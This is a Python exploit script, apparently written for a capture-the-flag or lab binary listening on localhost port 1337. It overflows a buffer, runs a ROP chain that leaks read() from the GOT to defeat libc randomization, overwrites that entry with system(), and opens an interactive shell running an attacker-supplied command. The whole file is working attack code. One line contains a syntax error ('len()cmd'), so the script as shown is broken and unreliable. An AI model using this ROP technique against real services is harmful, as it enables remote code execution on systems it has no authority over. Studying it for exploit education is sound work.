#!/usr/bin/python
import sys, socket
import struct
import telnetlib

addr = ('127.0.0.1', 1337)

cmd = sys.argv[1]+"\0"

#this is for my libc. your offsets may differ.
libcread_offset = 0xdabd0
libcsystem_offset = 0x40190

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = []
payload.append("A"*140)

#write stdin to .dynamic using read@plt
payload.append(struct.pack("<I", 0x0804832c)) #read() call loc #read@plt
payload.append(struct.pack("<I", 0x080484b6)) #pppr
payload.append(struct.pack("<I", 0)) #stdin
payload.append(struct.pack("<I", 0x08049530)) #.dynamic
payload.append(struct.pack("<I", len()cmd)) #length of cmd

#leak resolved addr of read() in randomized libc
payload.append(struct.pack("<I", 0x0804830c)) #write() call loc #write@plt
payload.append(struct.pack("<I", 0x080484b6)) #pppr
payload.append(struct.pack("<I", 1)) #stdout
payload.append(struct.pack("<I", 0x0804961c)) #read() in GOT #read@got.plt
payload.append(struct.pack("<I", 4)) #len

#call read@plt to overwrite the ptr stored in read()'s entry in GOT
payload.append(struct.pack("<I", 0x0804832c)) #read() call loc #read@plt
payload.append(struct.pack("<I", 0x080484b6)) #pppr
payload.append(struct.pack("<I", 0)) #stdin
payload.append(struct.pack("<I", 0x0804961c)) #read() in GOT #read@got.plt
payload.append(struct.pack("<I", 4)) #len

#call read@plt = addr of system() in libc
payload.append(struct.pack("<I", 0x0804832c)) #read() call loc #read@plt
payload.append("BBBB") #bogus retn addr
payload.append(struct.pack("<I", 0x08049530)) #.dynamic #system() arg

s.connect(addr)

s.send(''.join(payload))

s.send(cmd)

#calculate system() addr and send back
readaddr = struct.unpack("<I", s.recv(1024))[0]
print "libc read() found at 0x%.8x" % readaddr
systemaddr = readaddr - libcread_offset + libcsystem_offset
print "libc system() found at 0x%.8x" % systemaddr
s.send(struct.pack("<I", systemaddr))

#pass in /bin/sh to get shell
t = telnetlib.Telnet()
t.sock = s
t.interact()

print s.recv(1024)

s.close()
